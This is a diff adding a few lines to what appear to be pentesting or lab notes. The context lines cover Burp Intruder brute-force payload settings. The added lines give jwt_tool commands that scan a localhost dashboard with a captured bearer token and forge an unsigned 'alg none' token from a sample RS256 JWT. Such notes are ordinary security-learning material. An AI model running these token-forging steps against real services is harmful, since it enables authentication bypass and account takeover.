@@ -194,4 +194,11 @@ for more
 - payload set change to 2.
 - so here second position is a character so payload type bruteforce min max 1 and a-z.
 - payload set 3 we know its number so just 0-9 there ane min max is 1, and lunch the attack.
+
+- Using jwt_tool
+- capture the bearer token
+- then use `jwt_tool <bearer_token_here>`
+- then use `jwt_tool -t http://127.0.0.1/dashboard -rh "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QGVtYWlsLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgxODMwNjY0LCJleHAiOjE2ODI0MzU0NjR9.BjhOdsen5Y3Fnx2FyoO0rVoxMJ-RouFGxeJND1k20ZB01IJP1GfEvzId5mdhZDo8CtwDmZCgGFh9611LKNUlTIUqNnOs-l-IVmMdhE6qqEx0MQmNoekNeKFyaOodLkuz2dDHxk9CtQh-YFvbGq6LepQCxiyBkGASVXax9yD1HMBtsxiv-7REwQIV-lgLWGUSasnGO6c92emlPtBW-QaZflDT_eq7b9BozdFY_f5uFgUKdWl7J-q_vrnBiCuCHdPah-KvFeITbOE-Nb2AOMw-EIyjT5ccQE6cgQ0m2GQR3w_k7D0GOj6yIlfuHhr-21yOj3EWD5jSXoCA-RN3xp5TFQ" -M pb`
+- then for making new token `jwt_tool eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QGVtYWlsLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgxODMwNjY0LCJleHAiOjE2ODI0MzU0NjR9.BjhOdsen5Y3Fnx2FyoO0rVoxMJ-RouFGxeJND1k20ZB01IJP1GfEvzId5mdhZDo8CtwDmZCgGFh9611LKNUlTIUqNnOs-l-IVmMdhE6qqEx0MQmNoekNeKFyaOodLkuz2dDHxk9CtQh-YFvbGq6LepQCxiyBkGASVXax9yD1HMBtsxiv-7REwQIV-lgLWGUSasnGO6c92emlPtBW-QaZflDT_eq7b9BozdFY_f5uFgUKdWl7J-q_vrnBiCuCHdPah-KvFeITbOE-Nb2AOMw-EIyjT5ccQE6cgQ0m2GQR3w_k7D0GOj6yIlfuHhr-21yOj3EWD5jSXoCA-RN3xp5TFQ -X a`
+- this will generate new token which will only work in JWT (token ends with .)
 - 
